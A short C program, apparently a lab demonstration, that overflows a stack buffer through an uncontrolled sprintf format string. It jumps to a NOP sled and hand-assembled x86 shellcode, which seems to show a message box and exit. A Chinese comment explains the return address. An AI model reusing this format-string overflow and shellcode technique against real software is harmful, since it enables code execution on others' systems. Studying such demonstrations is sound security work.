#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

char user[]=
     "%497d\x39\x4a\x42\x00"
     "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
     "\x33\xDB\x53\x68\x62\x75\x70\x74\x68\x62\x75\x70\x74\x8B\xC4\x53"
     "\x50\x50\x53\xB8\x68\x3D\xE2\x77\xFF\xD0\x90\x90\x90\x90\x90\x90"
     "\xB8\xBB\xB0\xE7\x77\xFF\xD0\x90\x90\x90\x90";

void mem(){
	//__asm int 3
	char outbuf[512];
	char buffer[512];
	sprintf(
		buffer,
	    "ERR Wrong command: %.400s",
	    user
		);
	/*
	执行完上一步后buffer[]="ERR Wrong command: %497d\x39\x4a\x42\x00"
	00424a39为shellcode地址；此处仅仅就是一串<nop>而已
	*/
    sprintf(outbuf,buffer);//sprintf(outbuf,"ERR Wrong command: %497d\x39\x4a\x42\x00");
}

int main()
{
     LoadLibrary("user32.dll");
     mem();
	 return 0;
}


